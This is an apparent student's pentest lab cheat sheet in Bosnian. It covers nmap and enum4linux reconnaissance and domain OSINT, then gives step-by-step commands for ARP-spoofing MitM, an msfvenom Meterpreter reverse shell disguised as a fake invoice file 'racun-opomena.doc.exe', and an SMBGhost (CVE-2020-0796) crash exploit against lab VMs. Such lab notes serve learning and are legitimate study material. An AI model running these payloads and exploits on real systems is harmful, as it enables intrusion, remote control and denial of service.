Ako vec bude neki ip konfigurisan prvo skenirat online domenu a onda konfigurisat za lokalnog ovako (OBAVEZNO)

sudo ip addr flush dev eth0- brise staru ip adresu i onda sudo ip addr add

Na windows vm u cmd ukucati ipconfig vidjeti ip adresu npr.

 IPv4 Address: 192.168.56.101

Subnet Mask: 255.255.255.0

 i onda na linuxu kucat

sudo ip addr add 192.168.56.100/24 dev eth0

sudo ip link set eth0 up


ping 192.168.56.101

nmap -p 1-6000 192.168.56.101 â€“ svi portovi

nmap -sC -sV -O -p  22,80,445 192.168.56.101 â€“ defaultne skripte, verzije servisa

Ako ima:

Nmap â€“script ftp-anon -p 21 192.168.56.101 istestirati svaki otvoreni port da vidimo koji pruzaju sigurnosni rizik preko anonymous ftp allowed

Nmap â€“script ssh2-enum-algos -p 22 192.168.56.101 detektovanje zastarjelih kriptografksih algoritama na ssh servisu

enum4linux -a 192.168.56.101 - SMB

Ako ima 80 ili 443 whatweb http://192.168.56.101

Nikto -h http://192.168.56.101

445 - enum4linux 192.168.56.101

Searchsploit servis verzija

SSH â€“ 22 â€“ pazit na protokole

HTTP â€“ 80

HTTPS â€“ 443

SMB â€“ 445 â€“ signing iskljucen ne smije a ima puno propusta, star win server

RDP â€“ 3389 â€“ ne smije bit remote desktop aktivan



Za online domenu:

Ako ne bude prvobitne ip adrese treba konfigurisat gateway: ip route add default via 192.168.56.1

echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf

Whois domain.com â€“ vlasnik, registar, datumi, nameserveri

Nslookup domain.com â€“ dobija se ip adresa i DNS server

Curl -I https://domain.com â€“ HTTP zaglavlja

Whatweb domain ili curl domain.com | head â€“ tehnologije

Openssl s_client -connect domain.com:443 â€“ SSL certifikat

Curl https://example.com/robots.txt - ako postoji admin, backup, private 



21 FTP nmap --script ftp-anon -p 21 <target>

22 SSH nmap --script ssh-auth-methods -p 22 <target>

23 Telnet nmap -p 23 <target> (open = vulnerable)

25 SMTP nmap --script smtp-open-relay -p 25 <target>

53 DNS nmap --script dns-zone-transfer -p 53 <target>

80 HTTP nikto -h http://<target>

443 HTTPS nmap --script ssl-heartbleed -p 443 <t-arget>

445 SMB nmap --script smb-vuln* -p 445 <target>

3306 MySQL nmap --script mysql-empty-password -p 3306 <target>

3389 RDP nmap --script rdp-vuln* -p 3389 <target>

5900 VNC nmap --script vnc-info -p 5900 <target>

dig unmo.ba mx - daje infoooo

python3 cve_scan1.py <target>

sudo systemctl status NetworkManager
sudo systemctl stop NetworkManager
sudo systemctl start NetworkManager

u slucaju da nemamo nikakvog pocetnog interneta na linux masini a hocemo koristiti dig i skidati CVE skenere moramo ici
sudo systemctl start NetworkManager
sudo dhclient eth0 - dodjeljuje sam sve

mkdir INDEX
cd INDEX
touch file.txt
echo "tekst" > file.txt
chmod 700 .
chmod 600 file.txt
ls -l

ğŸ”¹ Internet = DHCP + NetworkManager ON
ğŸ”¹ Meta = Private switch + NetworkManager OFF + ruÄni IP

ğŸŸ¢ 1ï¸âƒ£ MiTM â€“ ARP Spoofing (Default Switch)
ğŸ“Œ MreÅ¾a (iz dokumenta)

Windows:

IP: 172.30.16.3
Mask: 255.255.240.0
Gateway: 172.30.16.1
DNS: 8.8.8.8


Kali:

IP: 172.30.16.2
Mask: 255.255.240.0
Gateway: 172.30.16.1
DNS: 8.8.8.8

ğŸ“Œ Konfiguracija Kali
sudo ip addr flush dev eth0
sudo ip addr add 172.30.16.2/20 dev eth0
sudo ip route add default via 172.30.16.1
ping 8.8.8.8

ğŸ“Œ UkljuÄi IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward


Mora vratiti:

1

ğŸ“Œ ARP Spoofing (2 terminala)
LaÅ¾iranje prema Windowsu
sudo arpspoof -i eth0 -t 172.30.16.3 -r 172.30.16.1

LaÅ¾iranje prema Gateway-u
sudo arpspoof -i eth0 -t 172.30.16.1 -t 172.30.16.3

ğŸ“Œ Provjera na Windowsu
arp -a


MAC od Kali (172.30.16.2) mora biti vezan i za gateway IP.

ğŸ“Œ Wireshark dokaz

Odaberi eth0

Filter: icmp

Ako vidiÅ¡ ping pakete â†’ MiTM uspjeÅ¡an

ğŸ”´ 2ï¸âƒ£ Meterpreter â€“ Reverse TCP

(Private switch â€“ bez interneta)

ğŸ“Œ Kali konfiguracija (iz dokumenta)
sudo ip addr flush dev eth0
sudo ip addr add 192.168.10.2/24 dev eth0
ifconfig eth0 up
netstat -rn

ğŸ“Œ Pokreni Apache
sudo systemctl start apache2


Provjera:

http://127.0.0.1

ğŸ“Œ Kreiranje payload-a
msfvenom -p windows/x64/meterpreter/reverse_tcp \
lhost=192.168.10.2 lport=5432 -f exe > racun-opomena.doc.exe

ğŸ“Œ Kopiraj payload
sudo mv racun-opomena.doc.exe /var/www/html/

ğŸ“Œ Listener (Kali)
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.2
set LPORT 5432
exploit

ğŸ“Œ Windows â€“ preuzimanje payload-a
curl http://192.168.10.2/racun-opomena.doc.exe -o racun-opomena.doc.exe


Pokrenuti fajl.

Ako uspije:

Meterpreter session opened


Test:

sysinfo

ğŸŸ£ 3ï¸âƒ£ SMBGhost â€“ CVE-2020-0796

(iz dokumentacije)

Windows meta:

IP: 192.168.1.10
Private switch
Firewall OFF


Kali:

IP: 192.168.1.15

ğŸ“Œ Provjera konekcije
ping 192.168.1.10

ğŸ“Œ Skeniranje porta
nmap -p 445 192.168.1.10


Port 445 mora biti open.

ğŸ“Œ Git clone (internet faza)
git clone https://github.com/BtrintKomoni/cve-2020-0796

ğŸ“Œ Pokretanje skenera
python3 cve-2020-0796-scanner.py 192.168.1.10


Ako vrati:

Vulnerable

ğŸ“Œ Crash exploit
git clone https://github.com/jiansitting/CVE-2020-0796
cd CVE-2020-0796
sudo python3 cve-2020-0796.py 192.168.1.10


Rezultat:

Windows Blue Screen

Reboot

âš ï¸ SWITCH LOGIKA (NAJBITNIJE)

MiTM â†’ Default Switch
Meterpreter â†’ Private Switch
SMBGhost â†’ Private Switch
Git clone â†’ Internet / Default Switch
